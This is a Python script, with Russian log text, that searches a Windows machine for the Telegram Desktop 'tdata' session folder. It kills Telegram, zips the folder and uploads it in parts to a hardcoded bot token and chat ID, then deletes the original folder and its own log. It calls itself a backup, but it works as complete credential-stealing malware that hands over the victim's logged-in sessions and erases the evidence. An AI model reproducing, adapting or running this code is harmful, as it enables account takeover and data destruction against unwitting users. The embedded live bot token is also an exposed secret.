import os
import zipfile
import getpass
import sys
import threading
from pathlib import Path
import time
import traceback
import psutil
import shutil
import requests

ARCHIVE_NAME = 'data.zip'
EXCLUDE_FILE = 'working'
CHUNK_SIZE = 49 * 1024 * 1024
TELEGRAM_BOT_TOKEN = '8434695020:AAGsS1Hc9WKIJlP0hfPiMXtR-FbdRSe-Lqk'
TELEGRAM_CHAT_ID = '1280219492'
LOG_FILE = None

def log(msg):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    line = f"[{timestamp}] {msg}"
    print(line)
    if LOG_FILE:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(line + '\n')

def kill_telegram_processes():
    killed = 0
    for proc in psutil.process_iter(['name', 'exe', 'cmdline']):
        try:
            if proc.info['name'] and 'telegram.exe' in proc.info['name'].lower():
                log(f'Завершаю процесс: {proc.info}')
                proc.kill()
                killed += 1
        except Exception as e:
            log(f'Ошибка при завершении процесса: {e}')
    if killed == 0:
        log('Процессов Telegram.exe не найдено или уже завершены.')
    else:
        log(f'Завершено процессов Telegram.exe: {killed}')

def find_tdata_folder():
    import glob
    user = getpass.getuser()
    script_dir = os.path.dirname(os.path.abspath(__file__))
    home = os.path.expanduser('~')
    candidates = [
        os.path.expandvars(r'C:\Users\%USERNAME%\AppData\Roaming\Telegram Desktop\tdata'),
        os.path.expandvars(r'C:\Users\%USERNAME%\AppData\Local\Telegram Desktop\tdata'),
        os.path.expandvars(r'C:\Users\%USERNAME%\Telegram Desktop\tdata'),
        os.path.expanduser(r'~\\Telegram Desktop\\tdata'),
        os.path.expanduser(r'~\\tdata'),
        os.path.join(script_dir, 'tdata'),
        os.path.join(home, 'Desktop', 'tdata'),
        os.path.join(home, 'Documents', 'tdata'),
        os.path.join(home, 'Downloads', 'tdata'),
    ]
    for path in candidates:
        log(f'Пробую путь: {path}')
        if os.path.isdir(path):
            log(f'Найдена tdata по стандартному или пользовательскому пути: {path}')
            return path
    search_dirs = [
        os.path.join(home, 'Desktop'),
        os.path.join(home, 'Documents'),
        os.path.join(home, 'Downloads'),
    ]
    for base in search_dirs:
        for root, dirs, files in os.walk(base):
            if 'tdata' in dirs:
                tdata_path = os.path.join(root, 'tdata')
                log(f'Найдена tdata в подпапке: {tdata_path}')
                return tdata_path
    user_root = os.path.join(r'C:\Users', user)
    for root, dirs, files in os.walk(user_root):
        if 'tdata' in dirs:
            tdata_path = os.path.join(root, 'tdata')
            log(f'Найдена tdata в подпапке пользователя: {tdata_path}')
            return tdata_path
    log('Папка tdata не найдена в популярных местах. Ищу Telegram.exe на всех дисках...')
    found = []
    def search_telegram_exe(disk_root):
        for root, dirs, files in os.walk(disk_root):
            if 'Telegram.exe' in files:
                exe_path = os.path.join(root, 'Telegram.exe')
                tdata_path = os.path.join(root, 'tdata')
                log(f'Нашёл Telegram.exe: {exe_path}, проверяю {tdata_path}')
                if os.path.isdir(tdata_path):
                    found.append(tdata_path)
                    log(f'Найдена tdata рядом с Telegram.exe: {tdata_path}')
                    break
    disks = [f'{d}:\\' for d in 'CDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f'{d}:\\')]
    threads = []
    for disk in disks:
        log(f'Запускаю поиск на диске {disk}')
        t = threading.Thread(target=search_telegram_exe, args=(disk,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    if found:
        log(f'Найдена tdata рядом с Telegram.exe: {found[0]}')
        return found[0]
    log('Папка tdata не найдена!')
    user_path = input('Папка tdata не найдена. Введите путь к tdata: ').strip('"')
    if os.path.isdir(user_path):
        log(f'Найдена tdata по введённому пути: {user_path}')
        return user_path
    log('Папка tdata не найдена! Проверьте путь и попробуйте снова.')
    return None

def make_zip(src_dir, zip_name, exclude_file):
    log(f'Архивирую папку {src_dir} в {zip_name}, исключая файл {exclude_file}')
    file_count = 0
    total_size = 0
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(src_dir):
            for file in files:
                if file == exclude_file:
                    log(f'Пропускаю файл: {file}')
                    continue
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, src_dir)
                zipf.write(file_path, arcname)
                file_size = os.path.getsize(file_path)
                log(f'Добавлен файл: {arcname} ({file_size} байт)')
                file_count += 1
                total_size += file_size
    log(f'Архив {zip_name} создан. Всего файлов: {file_count}, общий размер: {total_size} байт')
    if not os.path.isfile(zip_name):
        log(f'Ошибка: архив {zip_name} не создан!')
    else:
        log(f'Размер архива: {os.path.getsize(zip_name)} байт')

def split_archive(archive_path, chunk_size=CHUNK_SIZE):
    parts = []
    size = os.path.getsize(archive_path)
    log(f'Разбиваю архив {archive_path} на части по {chunk_size} байт (всего {size} байт)')
    with open(archive_path, 'rb') as f:
        idx = 1
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            part_name = f'{archive_path}.part{idx:03d}'
            with open(part_name, 'wb') as pf:
                pf.write(chunk)
            log(f'Создан кусок: {part_name} ({len(chunk)} байт)')
            parts.append(part_name)
            idx += 1
    return parts

def send_file_to_telegram(bot_token, chat_id, file_path):
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    with open(file_path, 'rb') as f:
        files = {'document': (os.path.basename(file_path), f)}
        data = {'chat_id': chat_id}
        try:
            response = requests.post(url, files=files, data=data)
            log(f'Отправка {file_path}: {response.status_code} {response.text}')
            if response.status_code == 200:
                log(f'Файл {file_path} успешно отправлен в Telegram!')
            else:
                log(f'Ошибка отправки {file_path} в Telegram: {response.text}')
        except Exception as e:
            log(f'Исключение при отправке {file_path} в Telegram: {e}\n{traceback.format_exc()}')

def send_log_to_telegram(bot_token, chat_id, log_path, caption=None):
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    with open(log_path, 'rb') as f:
        files = {'document': (os.path.basename(log_path), f)}
        data = {'chat_id': chat_id}
        if caption:
            data['caption'] = caption
        try:
            response = requests.post(url, files=files, data=data)
            log(f'Отправка лога: {response.status_code} {response.text}')
        except Exception as e:
            log(f'Исключение при отправке лога: {e}\n{traceback.format_exc()}')

if __name__ == '__main__':
    tdata_dir = None
    try:
        tdata_dir = find_tdata_folder()
        if not tdata_dir:
            print('Папка tdata не найдена!')
            sys.exit(1)
        log_dir = os.path.dirname(tdata_dir)
        LOG_FILE = os.path.join(log_dir, 'log_backup.txt')
        log('=== Запуск скрипта ===')
        kill_telegram_processes()
        archive_path = os.path.join(os.path.dirname(tdata_dir), ARCHIVE_NAME)
        make_zip(tdata_dir, archive_path, EXCLUDE_FILE)
        parts = split_archive(archive_path, CHUNK_SIZE)
        user = getpass.getuser()
        archive_size = os.path.getsize(archive_path)
        parts_count = len(parts)
        msg = (
            f'📦 Резервная копия tdata\n'
            f'Пользователь: {user}\n'
            f'Размер архива: {archive_size // (1024*1024)} МБ\n'
            f'Количество частей: {parts_count}\n'
            f'Каждая часть до 49 МБ.\n'
            f'Ожидайте все части для восстановления.'
        )
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': msg}
        try:
            response = requests.post(url, data=payload)
            log(f'Уведомление: {response.status_code} {response.text}')
        except Exception as e:
            log(f'Ошибка при отправке уведомления: {e}\n{traceback.format_exc()}')
        for part in parts:
            send_file_to_telegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, part)
        log('Все части архива отправлены в Telegram!')
        finish_msg = '✅ Все части архива отправлены! Вот лог выполнения:'
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': finish_msg}
        try:
            response = requests.post(url, data=payload)
            log(f'Финальное уведомление: {response.status_code} {response.text}')
        except Exception as e:
            log(f'Ошибка при отправке финального уведомления: {e}\n{traceback.format_exc()}')
        send_log_to_telegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, LOG_FILE)
        try:
            os.remove(archive_path)
            log(f'Удалён архив: {archive_path}')
            for part in parts:
                os.remove(part)
                log(f'Удалён кусок: {part}')
        except Exception as e:
            log(f'Ошибка при удалении архива или частей: {e}\n{traceback.format_exc()}')
        try:
            shutil.rmtree(tdata_dir)
            log(f'Папка tdata успешно удалена: {tdata_dir}')
        except Exception as e:
            log(f'Ошибка при удалении папки tdata: {e}\n{traceback.format_exc()}')
        try:
            os.remove(LOG_FILE)
            print(f'Лог-файл удалён: {LOG_FILE}')
        except Exception as e:
            print(f'Ошибка при удалении лог-файла: {e}')
    except Exception as e:
        err_msg = f'❌ Произошла ошибка: {e}\nЛог выполнения прилагается.'
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': err_msg}
        try:
            requests.post(url, data=payload)
        except Exception:
            pass
        if LOG_FILE and os.path.exists(LOG_FILE):
            send_log_to_telegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, LOG_FILE)
            try:
                os.remove(LOG_FILE)
            except Exception:
                pass
        log(f'Критическая ошибка: {e}\n{traceback.format_exc()}') 